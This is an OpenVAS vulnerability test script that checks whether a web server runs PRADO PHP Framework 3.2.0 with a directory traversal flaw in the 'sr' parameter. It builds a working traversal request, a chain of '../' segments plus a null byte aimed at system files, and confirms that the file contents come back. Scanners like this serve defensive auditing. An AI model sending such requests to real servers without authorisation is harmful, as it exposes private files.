###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_prado_php_framework_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# PRADO PHP Framework 'sr' Parameter Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "PRADO PHP Framework version 3.2.0 (r3169)";
tag_insight = "Input passed to the 'sr' parameter in 'functional_tests.php' and
  'functional.php'is not properly sanitised before being used to get the
  contents of a resource.";
tag_solution = "No solution or patch is available as of 20th November, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.pradosoft.com";
tag_summary = "This host is running PRADO PHP Framework and is prone to multiple directory
  traversal vulnerabilities.";

if(description)
{
  script_id(803116);
  script_version("$Revision: 12 $");
  script_bugtraq_id(56677);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-11-27 15:16:12 +0530 (Tue, 27 Nov 2012)");
  script_name("PRADO PHP Framework 'sr' Parameter Multiple Directory Traversal Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22937/");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2012110184");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118348/ZSL-2012-5113.txt");
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5113.php");

  script_description(desc);
  script_summary("Check for directory traversal vulnerability in PRADO PHP Framework");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

webPort = "";
files = "";

## Get HTTP port
webPort = get_http_port(default:80);
if(!webPort){
 webPort = 80;
}

if(!get_port_state(webPort)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:webPort)){
  exit(0);
}

foreach dir (make_list("/prado", "", cgi_dirs()))
{
  url = dir + "/";

  if(http_vuln_check(port:webPort, url:url, pattern:">PRADO Framework for PHP",
      check_header:TRUE, extra_check:make_list('>Prado Software<',
      '>PRADO QuickStart Tutorial<','>PRADO Blog<')))
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = dir + "/tests/test_tools/functional_tests.php?sr=" +
            crap(data:"../",length:3*15) + files[file] + "%00";

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:webPort, url:url, check_header:TRUE, pattern:file))
      {
        security_warning(webPort);
        exit(0);
      }
    }
  }
}
